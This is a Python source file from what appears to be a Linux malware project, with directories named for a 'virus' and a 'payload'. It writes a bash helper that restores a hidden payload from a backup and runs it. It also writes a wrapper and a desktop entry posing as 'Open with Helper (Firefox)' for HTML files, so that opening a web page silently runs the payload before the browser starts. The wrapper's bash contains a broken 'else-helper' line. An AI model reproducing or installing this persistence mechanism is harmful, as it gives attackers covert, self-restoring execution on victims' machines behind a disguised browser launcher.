import subprocess
import os
import tempfile
import hashlib
from pathlib import Path
import textwrap
from config import (DIR_SAVE_VIRUS, BACKUP_DIR_DEFAULT, PREFIX_DIR_PAYLOAD, HELPER_SCRIPT_NAME,
                    HELPER_DIR, DESKTOP_DIR, WRAPPER_DIR, WRAPPER_SCRIPT_NAME, FIREFOX_BIN,
                    DESKTOP_SCRIPT_NAME)


def write_executable(path: Path, content: str, mode: int = 0o755):
    path.write_text(content)
    path.chmod(mode)

def create_helper(progFileName: str, progFileBackup: str):
    """
    Creates a bash script to be used in cron job
    """

    dirSaveVirus = os.path.expanduser(DIR_SAVE_VIRUS)
    backupDir = os.path.expanduser(BACKUP_DIR_DEFAULT)

    try:
        os.makedirs(dirSaveVirus, exist_ok=True)
        os.makedirs(backupDir, exist_ok=True)
        dirSavePayload = tempfile.mkdtemp(prefix=PREFIX_DIR_PAYLOAD, dir=dirSaveVirus)
    except Exception as e:
        print(f"Error creating backup or virus directory: {e}")
        return None


    helper_dir = os.path.expanduser(HELPER_DIR)
    helper_path = Path(helper_dir) / HELPER_SCRIPT_NAME
    os.makedirs(HELPER_DIR, exist_ok=True)

    bash_content = f"""
    #!/usr/bin/env bash
    set -euo pipefail

    export DISPLAY=:0
    export XDG_RUNTIME_DIR=/run/user/1000
    export DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus

    PROG="{dirSavePayload}/{progFileName}"
    BACKUP="{backupDir}/{progFileBackup}"

    LOCKFILE="/tmp/payload-cron-runner.lock"

    # tránh chạy đồng thời
    (
      flock -n 9 || exit 0

      if [ ! -x "$PROG" ] && [ -f "$BACKUP" ]; then
        cp -a -- "$BACKUP" "$PROG"
        chmod +x -- "$PROG" || true
      fi

      # Chạy chương trình nếu có thể
      if [ -x "$PROG" ]; then
        cd "$HOME" || true
        exec "$PROG"
      fi

    ) 9>"$LOCKFILE"

"""
    write_executable(helper_path, bash_content)
    return helper_path

def create_wrapper(helper_path: Path):
    wrapper_dir = os.path.expanduser(WRAPPER_DIR)
    os.makedirs(wrapper_dir, exist_ok=True)
    wrapper_path = Path(wrapper_dir) / WRAPPER_SCRIPT_NAME
    os.makedirs(WRAPPER_DIR, exist_ok=True)
    content = textwrap.dedent(f"""\
        #!/usr/bin/env bash
        set -euo pipefail

        HELPER="{str(helper_path)}"
        BROWSER="{FIREFOX_BIN}"
        FILE="$1"

        if [ -x "$HELPER" ]; then
            "$HELPER" "$FILE"
        else-helper
            echo "$(date --iso-8601=seconds) - helper missing or not executable: $HELPER" >> "$HOME/open-with.log"
        fi

        exec "$BROWSER" "$FILE"
    """)
    write_executable(wrapper_path, content)
    return wrapper_path

def create_desktop(wrapper_path: Path):
    desktop_dir = os.path.expanduser(DESKTOP_DIR)
    os.makedirs(desktop_dir, exist_ok=True)
    desktop_path = Path(desktop_dir) / DESKTOP_SCRIPT_NAME
    content = textwrap.dedent(f"""\
        [Desktop Entry]
        Name=Open with Helper (Firefox)
        Exec={str(wrapper_path)} %f
        Terminal=false
        Type=Application
        MimeType=text/html;
        Categories=Network;WebBrowser;
    """)
    desktop_path.write_text(content)
    desktop_path.chmod(0o644)
    # update desktop database (user)
    subprocess.run(["update-desktop-database", desktop_dir], check=False)
    return desktop_path

def check_sum_content(content: str) -> str:
    h = hashlib.md5()
    h.update(content.encode('utf-8'))
    return h.hexdigest()

def install_desktop_entry(progFileName: str, progFileBackup: str) -> bool:
    helper_path = create_helper(progFileName, progFileBackup)
    if not helper_path.exists():
        print("Helper script was not created.")
        return False

    wrapper_path = create_wrapper(helper_path)
    if not wrapper_path.exists():
        print("Error creating wrapper script.")
        return False

    desktop_path = create_desktop(wrapper_path)
    if not desktop_path.exists():
        print("Error creating desktop entry.")
        return False

    print(f"✅ Created helper script: {helper_path}")
    print(f"✅ Created wrapper script: {wrapper_path}")
    print(f"✅ Created desktop entry: {desktop_path}")
    print("You can now set 'Open with Helper (Firefox)' as the default application for HTML files.")
    return True
